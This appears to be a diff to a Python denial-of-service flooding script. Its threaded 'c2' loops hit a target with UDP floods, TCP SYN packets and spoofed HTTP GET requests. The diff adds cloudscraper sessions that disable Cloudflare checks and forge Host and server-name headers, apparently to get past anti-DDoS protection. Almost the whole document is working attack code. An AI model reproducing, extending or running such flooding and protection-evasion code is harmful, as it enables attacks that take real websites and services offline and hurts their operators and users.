@@ -1,4 +1,4 @@
-import socket, threading, random, os, colorama, cloudscraper
+import socket, threading, random, os, colorama, cloudscraper, requests
 from sqlite3 import Time
 from scapy.all import *
 from colorama import Fore
@@ -146,7 +146,9 @@ try:
                 }
                 tls.connect((ip,port))
                 tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
-                scraper = cloudscraper.create_scraper()
+                session = requests.session()
+                scraper = cloudscraper.create_scraper(sess=session)
+                scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                 for i in range(bytes):
                     udp.sendto(byte, (ip,port))
                     udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
@@ -161,6 +163,11 @@ try:
                     tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                     tcp.send(tcp_packet, (ip,port))
                     scraper.get(ip, timeout=thrs)
+                    scraper = cloudscraper.create_scraper(server_hostname=fk)
+                    scraper.get(
+                        ip,
+                        headers={'Host': fk}
+                    )
             except OSError:
                 continue
             except TypeError:
@@ -213,7 +220,9 @@ try:
                 }
                 tls.connect((ip,port))
                 tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
-                scraper = cloudscraper.create_scraper()
+                session = requests.session()
+                scraper = cloudscraper.create_scraper(sess=session)
+                scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                 for i in range(bytes):
                     udp.sendto(byte, (ip,port))
                     udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
@@ -228,6 +237,11 @@ try:
                     tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
                     tcp.send(tcp_packet, (ip,port))
                     scraper.get(ip, timeout=thrs)
+                    scraper = cloudscraper.create_scraper(server_hostname=fk)
+                    scraper.get(
+                        ip,
+                        headers={'Host': fk}
+                    )
     for i in range(thrs):
         threads = threading.Thread(target=c2)
         threads.start()
